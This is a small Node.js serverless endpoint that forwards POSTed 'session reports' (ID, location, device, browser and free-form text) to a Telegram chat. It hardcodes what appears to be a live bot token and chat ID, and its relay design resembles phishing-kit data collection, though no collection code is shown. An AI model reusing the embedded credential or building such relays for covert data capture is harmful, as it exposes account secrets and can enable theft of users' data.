const axios = require('axios');

const BOT_TOKEN = "8567285538:AAHKfo8bqee43rprC-GCv3Je423R57YQkCE";
const CHAT_ID = "6886010817";

module.exports = async (req, res) => {
    if (req.method !== 'POST') return res.status(200).send('OK');

    const { sessionID, report, city, device, browser } = req.body;

    if (!sessionID) return res.status(400).send('Missing Session ID');

    try {
        const msg = `🔔 <b>Session Report</b>\n` +
            `🆔 ID: <code>${sessionID}</code>\n` +
            `🌍 Loc: ${city || 'Unknown'}\n` +
            `💻 Sys: ${device || 'Unknown'}\n` +
            `🌐 Browser: ${browser ? browser.substring(0, 30) + '...' : 'Unknown'}\n\n` +
            report;

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: msg,
            parse_mode: 'HTML'
        });

        return res.status(200).json({ success: true });
    } catch (error) {
        console.error("Report API Error:", error);
        return res.status(500).json({ error: error.message });
    }
};
